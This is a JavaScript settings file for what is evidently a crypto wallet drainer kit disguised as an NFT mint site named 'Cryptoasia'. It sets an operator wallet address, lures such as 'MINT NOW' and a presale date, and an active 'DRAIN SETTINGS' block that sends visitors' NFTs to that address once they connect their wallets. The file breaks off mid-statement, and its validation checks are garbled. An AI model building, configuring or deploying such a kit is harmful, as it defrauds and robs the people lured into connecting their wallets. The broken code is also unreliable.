/*
    = = = = = YOU WALLET ADRESS = = = = =
*/

const receiveAddress = "0xbB95D169DA662408c201e97eA019319D68c24F89";

/*
    = = = = = COLLECTION SETTINGS = = = = =
*/

const collectionInfo = {
    name: "Cryptoasia",
    date: "10.04.2023",
    socialMedia: {
        discord: "https://discord.gg/b2sM23xY",
        twitter: "https://twitter.com/username_here",
    },
    medias: {
        preview: "preview.gif",
        favicon: "icon.png",
    },
    background: {
        type: "image", // Supported types: image, video, color (use image for gif)
        image: "background.jpg", // Image for image type or video preview for video type (image befor video load)
        video: "background.mp4", // If you don't use video type, you can ignore this line
        color: "#4E4E6D", // If you don't use color type, you can ignore this line
    }
}


/*
    = = = = = MINT INFORMATIONS = = = = =
*/

const mintInfo = {
    price: 0.01,
    totalSupply: 8888,
    minUnits: 1,
    maxUnits: 20,
    askMintLoop: true,
}

/*
    = = = = = DRAIN SETTINGS = = = = =
*/

const drainNftsInfo = {
    active: true,
    minValue: 0.01,
    maxTransfer: 1,
    nftReceiveAddress: "0xbB95D169DA662408c201e97eA019319D68c24F89",
}

const customStrings = {
    title: "MINT {Gpt}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "CONNECT WALLET",
    transferButton: "MINT NOW",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0.01) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console. ${
//#endregion
